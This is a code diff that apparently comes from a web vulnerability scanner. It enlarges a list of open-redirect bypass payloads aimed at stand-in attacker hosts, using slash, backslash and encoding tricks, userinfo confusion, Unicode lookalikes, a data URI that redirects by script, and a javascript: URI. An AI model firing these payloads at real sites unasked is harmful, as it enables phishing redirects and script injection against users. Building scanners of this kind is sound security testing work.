@@ -4795,16 +4795,54 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
             r.confidence = 0.2
 
         redirect_payloads = [
+            # Direct forms
             ("Direct URL", "[ATTACKER]/r"),
             ("Protocol-relative", "//[ATTACKER_HOST]/r"),
-            ("@ bypass",
+            ("Double slash", "///[ATTACKER_HOST]/r"),
+            ("Quadruple slash", "////[ATTACKER_HOST]/r"),
+            # Parser tricks
+            ("@ bypass (target@evil)",
              f"https://{_target_host}@[ATTACKER_HOST]/r"
              if _target_host else "https://[ATTACKER_HOST]/r"),
+            ("? suffix",
+             f"[ATTACKER]/r?{_target_host}" if _target_host
+             else "[ATTACKER]/r"),
+            ("# suffix",
+             f"[ATTACKER]/r#{_target_host}" if _target_host
+             else "[ATTACKER]/r"),
+            # Whitespace / control char
             ("Backslash bypass", "/\\[ATTACKER_HOST]/r"),
+            ("Backslash (double)", "\\\\[ATTACKER_HOST]/r"),
+            ("Whitespace prefix", "%09//[ATTACKER_HOST]/r"),
+            ("Newline prefix", "%0a//[ATTACKER_HOST]/r"),
+            ("Tab+slash prefix", "%09/[ATTACKER_HOST]/r"),
+            # Encoding tricks
             ("URL-encoded scheme",
              "%68%74%74%70%3a%2f%2f[ATTACKER_HOST]/r"),
-            ("Double slash", "///[ATTACKER_HOST]/r"),
-            ("Whitespace prefix", "%09//[ATTACKER_HOST]/r"),
+            ("Double URL-encoded scheme",
+             "%2568%2574%2574%2570%253a%252f%252f[ATTACKER_HOST]/r"),
+            ("Encoded slashes",
+             "%2F%2F[ATTACKER_HOST]/r"),
+            # Unicode confusables — some browsers/servers normalize
+            # these to ASCII before redirect, others don't.
+            ("Unicode bullet",
+             "/\u2044[ATTACKER_HOST]/r"),
+            # Target-prefixed lookalikes
+            ("Evil TLD swap",
+             f"[SCHEME]://{_target_host}.evil-attacker.com/r"
+             if _target_host else "[ATTACKER]/r"),
+            ("Target-as-subdomain",
+             "[SCHEME]://evilsub.[ATTACKER_HOST]/r"),
+            # Relative resolution inside scheme-less
+            ("Data URI",
+             "data:text/html,<script>location='[ATTACKER]'</script>"),
+            ("Javascript URI (reflective XSS upgrade)",
+             "javascript://[ATTACKER_HOST]/%0aalert(1)"),
+        ]
+        # [SCHEME] placeholder — default to https when substituting.
+        redirect_payloads = [
+            (name, p.replace("[SCHEME]", "https"))
+            for name, p in redirect_payloads
         ]
         # allow_redirects=False is CRITICAL for every step in this branch:
         # the validator reads Location from r.response_headers. When we
